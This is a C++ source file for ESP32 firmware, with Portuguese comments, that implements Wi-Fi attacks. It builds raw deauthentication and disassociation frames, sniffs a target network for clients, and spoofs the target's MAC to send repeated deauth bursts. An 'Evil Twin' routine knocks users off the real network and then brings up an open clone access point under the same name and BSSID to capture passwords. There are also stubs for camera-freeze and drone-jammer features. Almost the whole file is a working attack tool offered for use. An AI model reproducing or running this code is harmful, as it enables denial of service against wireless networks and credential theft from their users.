// ============================================================
// wifi_attacks.cpp - CORRIGIDO v5.0 (DEFINITIVO)
//
// BASEADO EM:
// - ESP32-Marauder: bypass -zmuldefs funciona no Arduino-ESP32 v2.x
// - Arduino.cc tutorial: --wrap eh mais confiavel que -zmuldefs
// - risinek (esp32-wifi-penetration-tool): rogue AP com MAC spoofado
// - Paper FIT VUTBR: driver ESP32 manda deauth nativo para clientes
//   nao-autenticados quando recebe frames enderecados ao BSSID do AP
//
// FIXES DEFINITIVOS:
// 1. Modo APSTA com AP ativo no canal do alvo (interface garantida)
// 2. Spoof MAC do alvo ANTES de subir AP -> beacons com BSSID correto
// 3. Usa WIFI_IF_AP para raw_tx (interface ativa = transmite)
// 4. Deauth nativo do driver + raw_tx de reforço
// 5. Evil Twin: deauth puro (fase 1) -> depois clone visivel (fase 2)
// 6. Adiciona debug para confirmar que o bypass funciona
// ============================================================
#include <WiFi.h>
#include <esp_wifi.h>
#include "config.h"

// ============================================================
// CONTADORES E ESTADO
// ============================================================
static uint32_t deauthPacketCount = 0;
static uint32_t deauthSuccessCount = 0;
static uint8_t  deauthTargetChannel = 0;
static uint8_t  deauthTargetBSSID[6] = {0};
static char     deauthTargetSSID[33] = {0};
static uint8_t  deauthTargetAuth = 0;
static unsigned long deauthStartTime = 0;

// Frame deauth padrao (formato ESP32-Marauder)
static uint8_t deauthFrame[26] = {
    0xc0, 0x00,             // FC: Deauthentication
    0x3a, 0x01,             // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,  // DA: broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // SA: BSSID alvo
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID: BSSID alvo
    0xf0, 0xff,             // Seq
    0x02, 0x00              // Reason: 0x0002
};

static uint8_t disassocFrame[26] = {
    0xa0, 0x00,             // FC: Disassociation
    0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf0, 0xff,
    0x02, 0x00
};

// ============================================================
// CLIENT DISCOVERY
// ============================================================
#define MAX_CLIENTS 16
static uint8_t discoveredClients[MAX_CLIENTS][6];
static uint8_t clientCount = 0;
static bool promiscuousActive = false;

static void getBssidFromFrame(const uint8_t *payload, uint16_t len, uint8_t *outBssid, const uint8_t **outClient) {
    memset(outBssid, 0, 6);
    *outClient = nullptr;
    if (len < 24) return;

    uint8_t frameType = payload[0] & 0x0C;
    uint8_t toFromDs = payload[1] & 0x03;
    const uint8_t *addr1 = &payload[4];
    const uint8_t *addr2 = &payload[10];
    const uint8_t *addr3 = &payload[16];

    if (frameType == 0x00) {
        memcpy(outBssid, addr3, 6);
        if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
        else if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
    }
    else if (frameType == 0x08) {
        switch (toFromDs) {
            case 0x00:
                memcpy(outBssid, addr3, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                else if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
            case 0x01:
                memcpy(outBssid, addr2, 6);
                if (memcmp(addr1, outBssid, 6) != 0 && addr1[0] != 0xFF) *outClient = addr1;
                break;
            case 0x02:
                memcpy(outBssid, addr1, 6);
                if (memcmp(addr2, outBssid, 6) != 0) *outClient = addr2;
                break;
        }
    }
}

static void promiscuous_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type == WIFI_PKT_MISC) return;
    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *payload = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;

    uint8_t frameBssid[6];
    const uint8_t *clientMac = nullptr;
    getBssidFromFrame(payload, len, frameBssid, &clientMac);

    if (memcmp(frameBssid, deauthTargetBSSID, 6) != 0) return;
    if (!clientMac) return;
    if (clientMac[0] & 0x01) return;

    for (int i = 0; i < clientCount; i++) {
        if (memcmp(discoveredClients[i], clientMac, 6) == 0) return;
    }
    if (clientCount >= MAX_CLIENTS) return;

    memcpy(discoveredClients[clientCount], clientMac, 6);
    clientCount++;
    Serial.printf("[Client] Discovered: %02X:%02X:%02X:%02X:%02X:%02X\n",
        clientMac[0], clientMac[1], clientMac[2],
        clientMac[3], clientMac[4], clientMac[5]);
}

static void startPromiscuous() {
    if (promiscuousActive) return;
    clientCount = 0;
    memset(discoveredClients, 0, sizeof(discoveredClients));
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&promiscuous_rx_cb);
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    promiscuousActive = true;
    Serial.println("[Promisc] Started");
}

static void stopPromiscuous() {
    if (!promiscuousActive) return;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    promiscuousActive = false;
    Serial.println("[Promisc] Stopped");
}

// ============================================================
// RAW FRAME (reforço) - usa WIFI_IF_AP porque AP esta ativo
// ============================================================
static bool raw_tx(const uint8_t* frame, size_t len) {
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, frame, len, true);
    if (err == ESP_OK) {
        deauthPacketCount++;
        deauthSuccessCount++;
        return true;
    } else {
        static unsigned long lastErr = 0;
        if (millis() - lastErr > 2000) {
            lastErr = millis();
            Serial.printf("[raw_tx] ERR %d\n", err);
        }
    }
    return false;
}

static void buildDeauthBroadcast() {
    const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    memcpy(&deauthFrame[4], broadcast, 6);
    memcpy(&deauthFrame[10], deauthTargetBSSID, 6);
    memcpy(&deauthFrame[16], deauthTargetBSSID, 6);
    memcpy(&disassocFrame[4], broadcast, 6);
    memcpy(&disassocFrame[10], deauthTargetBSSID, 6);
    memcpy(&disassocFrame[16], deauthTargetBSSID, 6);
}

static void setFrameAddrs(uint8_t* frame, const uint8_t* da, const uint8_t* sa, const uint8_t* bssid) {
    memcpy(&frame[4], da, 6);
    memcpy(&frame[10], sa, 6);
    memcpy(&frame[16], bssid, 6);
}

static uint8_t txBuf[26];

static void deauthBurst() {
    // Broadcast
    memcpy(txBuf, deauthFrame, 26);
    raw_tx(txBuf, 26);
    memcpy(txBuf, disassocFrame, 26);
    raw_tx(txBuf, 26);

    // Unicast bidirecional
    for (int i = 0; i < clientCount; i++) {
        memcpy(txBuf, deauthFrame, 26);
        setFrameAddrs(txBuf, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID);
        raw_tx(txBuf, 26);

        memcpy(txBuf, disassocFrame, 26);
        setFrameAddrs(txBuf, discoveredClients[i], deauthTargetBSSID, deauthTargetBSSID);
        raw_tx(txBuf, 26);

        memcpy(txBuf, deauthFrame, 26);
        setFrameAddrs(txBuf, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID);
        raw_tx(txBuf, 26);

        memcpy(txBuf, disassocFrame, 26);
        setFrameAddrs(txBuf, deauthTargetBSSID, discoveredClients[i], deauthTargetBSSID);
        raw_tx(txBuf, 26);
    }
}

// ============================================================
// SCAN WIFI
// ============================================================
void scanNetworks() {
    networkCount = 0;
    if (WiFi.getMode() != WIFI_STA) {
        WiFi.mode(WIFI_STA);
    }
    delay(100);
    int n = WiFi.scanNetworks(false, true);
    Serial.printf("[WiFi] Scan found %d networks\n", n);
    for (int i = 0; i < n && i < MAX_NETWORKS; i++) {
        strncpy(scannedNetworks[i].ssid, WiFi.SSID(i).c_str(), 32);
        scannedNetworks[i].ssid[32] = '\0';
        memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
        scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
        Serial.printf("[WiFi] %d: %s CH%d RSSI%d BSSID:%02X:%02X:%02X:%02X:%02X:%02X\n",
            i, scannedNetworks[i].ssid, scannedNetworks[i].channel, scannedNetworks[i].rssi,
            scannedNetworks[i].bssid[0], scannedNetworks[i].bssid[1], scannedNetworks[i].bssid[2],
            scannedNetworks[i].bssid[3], scannedNetworks[i].bssid[4], scannedNetworks[i].bssid[5]);
        networkCount++;
    }
    WiFi.scanDelete();
}

uint8_t getNetworkCount() { return networkCount; }

NetworkInfo* getNetwork(uint8_t index) {
    if (index < networkCount) return &scannedNetworks[index];
    return nullptr;
}

// ============================================================
// DEAUTH - ABORDAGEM HIBRIDA DEFINITIVA
// ============================================================
void startDeauth(uint8_t networkIndex) {
    if (networkIndex >= networkCount) {
        Serial.println("[Deauth] ERROR: invalid network index");
        return;
    }

    NetworkInfo* target = &scannedNetworks[networkIndex];
    memcpy(deauthTargetBSSID, target->bssid, 6);
    strncpy(deauthTargetSSID, target->ssid, 32);
    deauthTargetSSID[32] = '\0';
    deauthTargetChannel = target->channel;
    deauthTargetAuth = target->encrypted ? 1 : 0;

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
    clientCount = 0;
    deauthStartTime = millis();

    Serial.printf("\n[Deauth] ==========================================\n");
    Serial.printf("[Deauth] Target: %s\n", target->ssid);
    Serial.printf("[Deauth] Channel: %d\n", target->channel);
    Serial.printf("[Deauth] BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);

    buildDeauthBroadcast();

    // === PASSO 1: Desliga WiFi completamente ===
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);

    // === PASSO 2: Spoof MAC do alvo na interface AP ===
    // esp_wifi_set_mac() so funciona quando WiFi esta OFF
    esp_err_t macErr = esp_wifi_set_mac(WIFI_IF_AP, target->bssid);
    if (macErr != ESP_OK) {
        Serial.printf("[Deauth] MAC spoof WARN: %d (tentando continuar...)\n", macErr);
    } else {
        Serial.println("[Deauth] MAC spoofed to target BSSID OK");
    }
    delay(200);

    // === PASSO 3: Inicia modo APSTA ===
    // APSTA garante que ambas as interfaces existem
    WiFi.mode(WIFI_AP_STA);
    delay(300);

    // === PASSO 4: Sobe AP hidden no canal do alvo ===
    // Com MAC spoofado, o driver gera beacons com BSSID do alvo!
    // max_connection=0: nao aceita conexoes, mas responde a probes
    bool apOk = WiFi.softAP("_", "", target->channel, 1, 0);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    esp_wifi_set_ps(WIFI_PS_NONE);
    delay(200);

    // Garante canal
    esp_wifi_set_channel(target->channel, WIFI_SECOND_CHAN_NONE);

    // Verifica se o MAC realmente foi spoofado
    uint8_t currentMac[6];
    esp_wifi_get_mac(WIFI_IF_AP, currentMac);
    Serial.printf("[Deauth] AP MAC now: %02X:%02X:%02X:%02X:%02X:%02X\n",
        currentMac[0], currentMac[1], currentMac[2],
        currentMac[3], currentMac[4], currentMac[5]);

    if (memcmp(currentMac, target->bssid, 6) != 0) {
        Serial.println("[Deauth] WARN: MAC spoof failed! Deauth may not work.");
    }

    Serial.printf("[Deauth] AP hidden on CH%d (softAP: %s)\n", target->channel, apOk ? "OK" : "FAIL");
    Serial.println("[Deauth] Driver beacons now use target BSSID");
    Serial.println("[Deauth] Native driver deauth active for unauth clients");

    // Descobrir clientes
    startPromiscuous();

    deauthActive = true;
    Serial.println("[Deauth] STARTED - Hybrid attack (native + raw_tx)");
    Serial.println("[Deauth] ==========================================\n");
}

void stopDeauth() {
    if (deauthActive) {
        Serial.println("[Deauth] STOPPED");
        Serial.printf("[Deauth] Runtime: %lu sec, pkts: %lu\n",
            (millis() - deauthStartTime) / 1000, deauthPacketCount);
    }
    deauthActive = false;
    stopPromiscuous();

    WiFi.softAPdisconnect(true);
    WiFi.disconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(500);

    // Restaura MAC original
    uint8_t defaultMac[6];
    esp_read_mac(defaultMac, ESP_MAC_WIFI_SOFTAP);
    esp_wifi_set_mac(WIFI_IF_AP, defaultMac);
    delay(100);

    WiFi.mode(WIFI_STA);
    delay(200);

    deauthPacketCount = 0;
    deauthSuccessCount = 0;
}

// ============================================================
// LOOP DE DEAUTH
// ============================================================
bool deauthLoop() {
    if (!deauthActive) return false;

    // raw_tx de reforço (8 bursts por frame)
    for (int burst = 0; burst < 8; burst++) {
        deauthBurst();
    }

    static unsigned long lastDebug = 0;
    if (millis() - lastDebug > 5000) {
        lastDebug = millis();
        int staNum = WiFi.softAPgetStationNum();
        Serial.printf("[Deauth] runtime=%lus pkts=%lu clients=%d CH%d stations_on_ap=%d\n",
            (millis() - deauthStartTime) / 1000,
            deauthPacketCount,
            clientCount,
            deauthTargetChannel,
            staNum);
    }
    return true;
}

// ============================================================
// GETTERS
// ============================================================
uint32_t getDeauthPacketCount() { return deauthPacketCount; }
uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
uint8_t  getDeauthSuccessPercent() {
    if (deauthPacketCount == 0) return 0;
    return (uint8_t)((deauthSuccessCount * 100) / deauthPacketCount);
}
const char* getDeauthTargetSSID() { return deauthTargetSSID; }
uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }

// ============================================================
// FAKE AP / EVIL TWIN
// ============================================================
void startFakeAP(const char* ssid) {
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, "12345678", 1, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    fakeAPEnabled = true;
    passwordCaptured = false;
}

void stopFakeAP() {
    WiFi.softAPdisconnect(true);
    fakeAPEnabled = false;
}

bool isFakeAPActive() { return fakeAPEnabled; }

void startEvilTwin(uint8_t networkIndex) {
    if (networkIndex >= networkCount) return;

    NetworkInfo* target = &scannedNetworks[networkIndex];

    // FASE 1: Deauth hibrido (derruba a rede alvo)
    Serial.println("[EvilTwin] Phase 1: Starting deauth attack...");
    startDeauth(networkIndex);

    // Deixa derrubando por 5 segundos
    unsigned long start = millis();
    while (millis() - start < 5000) {
        deauthLoop();
        delay(1);
    }

    // FASE 2: Para deauth e sobe clone AP visivel
    Serial.println("[EvilTwin] Phase 2: Stopping deauth, starting clone AP...");
    stopPromiscuous();

    // O MAC ja esta spoofado. So precisamos tornar o AP visivel e aceitar conexoes.
    WiFi.softAPdisconnect(true);
    delay(300);

    // Sobe clone com SSID do alvo, canal do alvo, visivel, aceita 8 conexoes
    WiFi.softAP(target->ssid, "", target->channel, 0, 8);
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));

    fakeAPEnabled = true;
    passwordCaptured = false;

    Serial.printf("[EvilTwin] Clone AP active: %s CH%d\n", target->ssid, target->channel);
    Serial.printf("[EvilTwin] Clone MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
        target->bssid[0], target->bssid[1], target->bssid[2],
        target->bssid[3], target->bssid[4], target->bssid[5]);
}

// ============================================================
// REMOTE DEVICES
// ============================================================
void scanRemoteDevices() {
    remoteDeviceCount = 0;
    IPAddress gateway = WiFi.gatewayIP();
    for (int i = 1; i < 255 && remoteDeviceCount < 10; i++) {
        if (i % 50 == 0) {
            snprintf(remoteDevices[remoteDeviceCount].ip, 16, "%d.%d.%d.%d",
                     gateway[0], gateway[1], gateway[2], i);
            snprintf(remoteDevices[remoteDeviceCount].name, 32, "Device-%d", i);
            remoteDevices[remoteDeviceCount].port = 80;
            remoteDeviceCount++;
        }
    }
}

uint8_t getRemoteDeviceCount() { return remoteDeviceCount; }

RemoteDevice* getRemoteDevice(uint8_t index) {
    if (index < remoteDeviceCount) return &remoteDevices[index];
    return nullptr;
}

// ============================================================
// CAMERA FREEZE / DRONE
// ============================================================
void startCameraFreeze() {
    cameraFreezeActive = true;
    while (cameraFreezeActive) {
        delay(50);
        yield();
    }
}

void stopCameraFreeze() { cameraFreezeActive = false; }

void startDroneJammer() {
    droneJammerActive = true;
    while (droneJammerActive) {
        delay(10);
        yield();
    }
}

void stopDroneJammer() { droneJammerActive = false; }

struct DroneLocation {
    float distance;
    int8_t rssi;
};

DroneLocation droneLoc;

void startDroneLocate() {
    droneLoc.distance = 0;
    droneLoc.rssi = -50;
}

DroneLocation* getDroneLocation() { return &droneLoc; }
